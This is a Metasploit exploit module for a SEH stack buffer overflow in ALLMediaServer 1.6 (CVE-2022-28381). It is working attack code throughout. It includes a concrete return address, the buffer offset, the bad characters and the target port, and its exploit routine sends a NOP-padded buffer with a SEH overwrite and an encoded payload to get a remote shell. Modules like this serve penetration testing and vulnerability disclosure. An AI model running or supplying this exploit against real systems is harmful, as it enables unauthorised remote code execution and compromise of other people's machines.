##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Seh

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'ALLMediaServer 1.6 SEH Buffer Overflow',
        'Description' => %q{
          This module exploits a stack buffer overflow leading to a SEH handler overwrite
          in ALLMediaServer 1.6. The vulnerability is caused due to a boundary error
          within the handling of a HTTP request. Note that this exploit will only work
          against x86 or WoW64 targets, x64 is not supported at this time.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Hejap Zairy Al-Sharif', # Aka @Matrix07ksa. Remote exploit and Metasploit module
        ],
        'DefaultOptions' => {
          'EXITFUNC' => 'process'
        },
        'Platform' => 'win',
        'Arch' => [ARCH_X86],
        'Payload' => {
          'BadChars' => '\x00\x0a\x0d\xff'
        },
        'Targets' => [
          [
            'ALLMediaServer 1.6',
            {
              'Ret' => 0x0040590B, # POP ESI # POP EBX # RET
              'Offset' => 1072
            }
          ],
        ],
        'Privileged' => false,
        'DisclosureDate' => '2022-04-01',
        'DefaultTarget' => 0,
        'References' => [
          ['CVE', '2022-28381'],
          ['URL', 'https://github.com/Matrix07ksa/ALLMediaServer-1.6-Buffer-Overflow']
        ],
        'Notes' => {
          'Stability' => [CRASH_SERVICE_DOWN], # If this fails the service will go down and will not restart.
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
    register_options([Opt::RPORT(888)])
  end

  def exploit
    connect
    buffer = ''
    buffer << make_nops(target['Offset'])
    buffer << generate_seh_record(target.ret)
    buffer << make_nops(100)
    buffer << payload.encoded
    buffer << make_nops(50)
    print_status('Sending payload to exploit MediaServer...')
    sock.put(buffer)
    print_status('Sent payload...hopefully we should get a shell!')
    handler
    disconnect
  end
end
